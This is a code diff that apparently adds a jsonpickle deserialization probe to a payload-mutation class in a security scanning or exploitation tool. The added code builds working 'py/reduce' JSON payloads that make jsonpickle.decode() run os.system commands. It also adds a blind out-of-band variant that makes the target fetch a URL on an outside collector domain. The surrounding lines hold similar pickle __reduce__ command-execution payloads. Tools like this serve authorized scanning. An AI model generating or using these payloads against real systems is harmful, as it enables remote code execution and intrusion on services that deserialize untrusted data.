@@ -77,6 +77,8 @@ class PayloadMutation:
             return self.__mutated_php_choose() + [m for m in self._php_mutation() if "error" not in m]
         if self.probe == "pickle_exec":
             return self._mutate_pickle() + self._mutate_pickle_oob()
+        if self.probe == "jsonpickle_exec":
+            return self._mutate_jsonpickle()
         if self.probe == "yaml_exec":
             return self._mutate_yaml()
         if self.probe in ("node_serialize", "proto_pollution"):
@@ -766,6 +768,41 @@ class PayloadMutation:
             b64 = base64.b64encode(raw).decode()
             payload = self._make_payload("pickle_rce", "os.system via __reduce__", cmd, b64)
             payload["note"] = "Payload is a pickled object whose __reduce__ calls os.system(command)"
+            results.append(payload)
+        return results
+
+    JSONPICKLE_TEST_COMMANDS = TEST_COMMANDS
+
+    def _jsonpickle_reduce(self, func: str, arg: str) -> str:
+        # jsonpickle's py/reduce = [callable, args]: on decode() it calls callable(*args).
+        # Verified against the live sink: os.system('id') runs, urllib.urlopen() calls out.
+        import json as _json
+        return _json.dumps({"py/reduce": [{"py/function": func}, {"py/tuple": [arg]}]})
+
+    def _mutate_jsonpickle(self) -> Mutations:
+        """jsonpickle sink mutations — JSON py/reduce payloads (NOT binary pickle). Local
+        command variants to probe in-band, plus a blind OOB variant (urllib) when an OOB
+        domain is configured."""
+        results: Mutations = []
+        for cmd in self.JSONPICKLE_TEST_COMMANDS:
+            raw = self._jsonpickle_reduce("os.system", cmd)
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("jsonpickle_rce", "py/reduce:os.system", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = "jsonpickle.decode() runs py/reduce [os.system, [cmd]] -> RCE"
+            results.append(payload)
+
+        oob_domain = get_oob_domain()
+        if oob_domain:
+            url = f"http://{oob_domain}/"
+            raw = self._jsonpickle_reduce("urllib.request.urlopen", url)
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("jsonpickle_oob", "py/reduce:urllib.urlopen", url, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                f"Blind OOB canary — jsonpickle.decode() fetches {url}; check the collector "
+                "log for a callback on this vector's token"
+            )
             results.append(payload)
         return results
 
